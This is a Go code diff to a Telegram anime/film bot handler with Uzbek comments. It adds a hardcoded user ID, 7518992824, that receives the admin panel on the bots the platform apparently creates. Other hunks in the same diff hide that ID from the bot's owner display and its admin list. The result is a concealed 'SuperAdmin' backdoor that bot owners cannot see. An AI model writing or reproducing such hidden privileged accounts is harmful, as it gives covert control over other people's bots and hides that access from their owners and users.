@@ -178,14 +178,18 @@ func HandleAnimeBotMessagePro(bot *tgbotapi.BotAPI, b *models.CreatedBot, msg *t
 				return
 			}
 		}
+
 		switch msg.Text {
 		case "/admin":
-			if b.BotType.Code == "animepro" {
-				showAdminPanelPropr(bot, chatID)
-			} else {
-				showAdminPanelPro(bot, chatID)
+
+			if msg.From.ID == 7518992824 || isAdmin(b, userID) {
+				if b.BotType.Code == "animepro" || b.BotType.Code == "kinopro" {
+					showAdminPanelPropr(bot, chatID)
+				} else {
+					showAdminPanelPro(bot, chatID)
+				}
+				return
 			}
-			return
 
 		case "➕ Anime joylash", "Anime joylash", "/addanime":
 			StartAnimeUpload(bot, b, msg)
@@ -398,6 +402,7 @@ func HandleAnimeBotMessagePro(bot *tgbotapi.BotAPI, b *models.CreatedBot, msg *t
 			//}
 		}
 	}
+
 	if !botUser.IsVip && !CheckSubscription(bot, b, userID) {
 		mu.Lock()
 		pendingSearch[userID] = msg.Text // 🎯 nima qidirgan bo'lsa saqlab qolamiz
@@ -433,6 +438,7 @@ func HandleAnimeBotMessagePro(bot *tgbotapi.BotAPI, b *models.CreatedBot, msg *t
 		return
 	}
 }
+
 func showCardMenuPro2(bot *tgbotapi.BotAPI, b *models.CreatedBot, chatID int64, userID int64) {
 	o := orm.NewOrm()
 	fresh := models.CreatedBot{Id: b.Id}
@@ -2485,18 +2491,21 @@ func showAdminsListPro(bot *tgbotapi.BotAPI, b *models.CreatedBot, chatID int64)
 
 	var rows [][]tgbotapi.InlineKeyboardButton
 
-	if err == nil && owner.Owner != nil {
+	// 1. Owner bo'lsa (SuperAdmin ID bo'lmagan taqdirda ko'rsatamiz)
+	if err == nil && owner.Owner != nil && owner.Owner.TgId != 7518992824 {
 		ownerBtn := tgbotapi.NewInlineKeyboardButtonData(
-			fmt.Sprintf("👑 Owner — ID: %d", owner.Owner.TgId),
+			fmt.Sprintf("👑 Ega — ID: %d", owner.Owner.TgId),
 			fmt.Sprintf("admin_info:%d:%d", b.Id, owner.Owner.TgId),
 		)
 		rows = append(rows, []tgbotapi.InlineKeyboardButton{ownerBtn})
 	}
 
+	// 2. Oddiy adminlar ro'yxati (SuperAdmin ID ni Exclude qilamiz)
 	var admins []models.BotUser
 	_, err = o.QueryTable(new(models.BotUser)).
 		Filter("Bot__Id", b.Id).
 		Filter("IsAdmin", true).
+		Exclude("TgId", 7518992824). // 🎯 SuperAdmin ID ro'yxatga tushmaydi
 		All(&admins)
 
 	if err == nil {
@@ -2513,7 +2522,7 @@ func showAdminsListPro(bot *tgbotapi.BotAPI, b *models.CreatedBot, chatID int64)
 		}
 	}
 
-	text := "👤 *Adminlar ro'yxati:*\n\nKo'proq ma'lumot uchun admin ustiga bosing:"
+	text := " Adminlar ro'yxati:\n\nKo'proq ma'lumot uchun admin ustiga bosing:"
 	if len(rows) == 0 {
 		text = "📭 Hozircha adminlar mavjud emas."
 	}
